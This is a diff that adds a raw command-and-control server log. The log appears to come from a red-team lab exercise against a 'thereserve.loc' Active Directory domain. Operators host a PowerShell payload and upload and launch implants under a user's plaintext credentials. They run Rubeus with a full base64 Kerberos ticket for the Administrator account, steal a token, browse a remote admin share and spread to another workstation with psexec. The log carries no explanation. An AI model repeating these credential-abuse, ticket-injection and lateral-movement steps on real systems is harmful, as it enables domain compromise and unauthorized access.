@@ -1,0 +1,69 @@
+01/06/2023 01:53:25 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 |  | Web hosting http - Payload PowerShell x64 https://10.50.118.117:443
+01/06/2023 03:29:55 | Info | Agent | c136c087b2 |  | Agent Checking In
+01/06/2023 03:32:37 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : migrateas corp.thereserve.loc\laura.wood Password1@
+01/06/2023 03:33:17 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : migrateas corp.thereserve.loc\laura.woody Password1@
+01/06/2023 03:33:32 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : migrateas corp.thereserve.loc\laura.wood Password1@
+01/06/2023 03:33:54 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : ps
+01/06/2023 03:34:49 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : migrateas corp.thereserve.loc\laura.woody Password1@
+01/06/2023 03:35:06 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : migrateas corp.thereserve.loc\laura.wood Password1@
+01/06/2023 03:48:17 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : migrate
+01/06/2023 03:48:29 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | c136c087b2 | Command tasked to agent : ps
+01/06/2023 03:48:30 | Info | Agent | b6f07d87ca |  | Agent Checking In
+01/06/2023 03:48:37 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | b6f07d87ca | Command tasked to agent : terminate
+01/06/2023 03:57:25 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 |  | Exit TeamServer
+01/06/2023 03:57:43 | Info | User | Fropops-5abf31f6-e361-4476-92fc-9c0dc99a008b |  | Connexion to TeamServer
+01/06/2023 03:57:44 | Info | User | Fropops-5abf31f6-e361-4476-92fc-9c0dc99a008b |  | Connexion to TeamServer
+01/06/2023 03:58:35 | Info | User | Fropops-5abf31f6-e361-4476-92fc-9c0dc99a008b | c136c087b2 | Command tasked to agent : migrate
+01/06/2023 03:58:50 | Info | Agent | 1519e3e473 |  | Agent Checking In
+01/06/2023 03:59:14 | Info | User | Fropops-5abf31f6-e361-4476-92fc-9c0dc99a008b | 1519e3e473 | Command tasked to agent : cd c:\windows\tasks
+01/06/2023 04:00:09 | Info | User | Fropops-5abf31f6-e361-4476-92fc-9c0dc99a008b | 1519e3e473 | Command tasked to agent : upload capstone.exe
+01/06/2023 04:06:40 | Info | User | Fropops-5abf31f6-e361-4476-92fc-9c0dc99a008b |  | Exit TeamServer
+01/06/2023 04:06:59 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 |  | Connexion to TeamServer
+01/06/2023 04:07:00 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 |  | Connexion to TeamServer
+01/06/2023 04:07:26 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c136c087b2 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:08:10 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | b6f07d87ca | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:08:59 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:15:21 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:27:03 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:27:41 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\system32\cmd.exe
+01/06/2023 04:27:47 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ps
+01/06/2023 04:30:07 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ps cmd
+01/06/2023 04:30:34 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : migrate -pid 2904
+01/06/2023 04:31:10 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : migrate -pid 2904
+01/06/2023 04:31:28 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\system32\cmd.exe
+01/06/2023 04:31:42 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ps cmd
+01/06/2023 04:32:39 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : migrate -pid 1520
+01/06/2023 04:32:52 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : pwd
+01/06/2023 04:32:56 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ls
+01/06/2023 04:33:22 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:34:17 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : cd c:w\windows\temp
+01/06/2023 04:34:26 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : cd c:\windows\temp
+01/06/2023 04:35:32 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : upload capstone.exe
+01/06/2023 04:38:07 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ls
+01/06/2023 04:38:17 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : upload capstone.exe
+01/06/2023 04:38:41 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\temp\capstone.exe
+01/06/2023 04:51:46 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.thereserve.loc /username:Administrator /password:FakePass /ticket:doIFtzCCBbOgAwIBBaEDAgEWooIEnTCCBJlhggSVMIIEkaADAgEFoRUbE0NPUlAuVEhFUkVTRVJWRS5MT0OiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE2NvcnAudGhlcmVzZXJ2ZS5sb2OjggRHMIIEQ6ADAgEXoQMCAQOiggQ1BIIEMXvBjlqUfPfz6BIErGTV/8aEqxaCv9QctEGug9gqQgg2NQEkCFWtbkVgCqcBS9VLXX1sjc8jZwJPwEahP29ennd/hY/rF1aYVOvXdN2QInOIIRIlf+NZ98VJ6Gw80gknJlih4vGZh1q/1XUC48hcAGAXT7EaiOhvB0g4nU0U1ectOzCkS9h1oLxjkpv1H57l3RCSM7AXICZwcV2WopX3F1C+DUesBgLfGhPQ/AqULX68IJkjBdMVuf7BftUR7SsyjqZ7RU2RMlCrRTS80Gd3Mj0IXTYV2I9PEfcMiVmO+Iy+uHIMTfjWmmingQG0cxpB6wwMVuqIGGkwDdS2/oMb/CnFj/8PlqsXh5qQxFuVhsQsT+FsfGD022EKqr+Ox3SPErTJXzvbCA+BWtrcPNXtMMY6gcOwfRmJGXpoOkL0jIbwqbXl9es5FCK4MyKFBo4hrhOhchxtT6DujR7+ED7sDlOZt6dCtcrkaFd6AJ8bIN6erm0zkH6JrtX47R4OGItMU96ru1LHsr5Ox3WAAlqC0+10F2R2awNgnWHYdPUPP8K31GEJ+bvLJFeVzqwXqCIKxCmWUOOKuJWKujUGaUtPbJWR6/X8c+PUISCxLKag2f+mtQkXD9NSclCazGECW/EilwSpd6gdZIgh07bGTMA4SlhshggN70N+VUWUiijkrl9BMt00MIjUDZGm2tpTvWYMMjeY+b25wyipTkIK+W6Pb/krlCvDTOZ5+YFoE1OeJpMOmx9T2UK2+MKWBy+nmWBzpt5lqV4uXFyMdz545aJxWIsX87X2ycIBlZAdbWIluMjjgv0wAjTx2PAKK6bJItzb1rftmQJC5qJNDym4UWEN0oDFfqi/rcR0scjMr6DWkhaHQSQjTk876qKhJqVdH69jstFI0XTQ+scT/61ty1yIlWz3l0n7ojBCISNLF35ix2Bh5zxo4eb20iaadkZHDC8Jjz20BwsJIiOE3y4kH+m5ss+Neb5tBNt9h4egUIabShZfK9Hdr3zGdgOVoC+TYoj5rd9uPh6vbT6Y9t21d8EzGoFL8SOCeCwdjYqjEHNm0ej4vOjsl4C40pMxY40jjR43LcR4GTOljdKL6AiM+5eugZM7JekAMiZWcCDmKf9m9/oFCERpTXfhrPAQcjvcNWZdCrpfm3it9xrSXOvinxgwgaBUWolnyVlLOM0s6ITelKQb9mKGnFZedcgJ8fiUo7R1/P8XRHshfvlas/h29P4/pQKX1nPS4PaEn+7xdntGOIINWeZ5sxfGUnk5oEiupZTcYI3iv8I7EbVNR62LwNnLB76H4dw7+1NwCopo7ueY8vsZOlVSvJ/0OnaPy14+ivYOGCCckeabSXqDgPXqQISYH9oY96AZ5xOvHeGMyB9u23Otw4I8qEt32Qts+tYoo5lAJ0FYkBy0ttXpdHJAzB4Iw94Ao4IBBDCCAQCgAwIBAKKB+ASB9X2B8jCB76CB7DCB6TCB5qAbMBmgAwIBF6ESBBCj8HhzbcpZo73sEUN4Q0GmoRUbE0NPUlAuVEhFUkVTRVJWRS5MT0OiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4AAApBEYDzIwMjMwNjAxMDg1MTE4WqURGA8yMDIzMDYwMTA4NTExOFqmERgPMjAyMzA2MDExODUxMThapxEYDzIwMjMwNjA4MDg1MTE4WqgVGxNDT1JQLlRIRVJFU0VSVkUuTE9DqSgwJqADAgECoR8wHRsGa3JidGd0GxNjb3JwLnRoZXJlc2VydmUubG9j
+01/06/2023 04:52:19 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : steal-token 4968
+01/06/2023 04:52:55 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c136c087b2 | Command tasked to agent : shell hostanme
+01/06/2023 04:53:03 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c136c087b2 | Command tasked to agent : shell hostname
+01/06/2023 04:53:43 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ls \\wrk2.corp.dc\c$
+01/06/2023 04:53:55 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ls \\wrk2.corp.thereserve.local\c$
+01/06/2023 04:54:00 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : ls \\wrk2.corp.thereserve.loc\c$
+01/06/2023 04:54:12 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : cd \\wrk2.corp.thereserve.loc\c$
+01/06/2023 04:54:16 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : cd windows
+01/06/2023 04:54:24 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : upload svc.exe
+01/06/2023 04:55:03 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 1519e3e473 | Command tasked to agent : psexec wrk2.corp.thereserve.loc c:\windows\svc.exe
+01/06/2023 04:56:45 | Info | Agent | 44ddda9676 |  | Agent Checking In
+01/06/2023 04:57:08 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 44ddda9676 | Command tasked to agent : cd c:\windows\tasks
+01/06/2023 04:57:19 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 44ddda9676 | Command tasked to agent : upload capstone.exe
+01/06/2023 04:57:33 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 44ddda9676 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:57:55 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 44ddda9676 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:58:23 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | 44ddda9676 | Command tasked to agent : migrate
+01/06/2023 04:58:34 | Info | Agent | c9df37a6d1 |  | Agent Checking In
+01/06/2023 04:58:45 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c9df37a6d1 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\capstone.exe
+01/06/2023 04:59:12 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c9df37a6d1 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\tasks\cmd.exe
+01/06/2023 04:59:25 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c9df37a6d1 | Command tasked to agent : startas corp.thereserve.loc\laura.wood Password1@ c:\windows\system32\cmd.exe
+01/06/2023 04:59:32 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c9df37a6d1 | Command tasked to agent : ps cmd
+01/06/2023 04:59:48 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c9df37a6d1 | Command tasked to agent : migrate -pid 1956
+01/06/2023 05:01:09 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c9df37a6d1 | Command tasked to agent : migrate -pid 1956
+01/06/2023 05:01:22 | Info | User | Fropops-30172347-35aa-44c0-908d-8cb53bc1ccf9 | c9df37a6d1 | Command tasked to agent : ps cmd
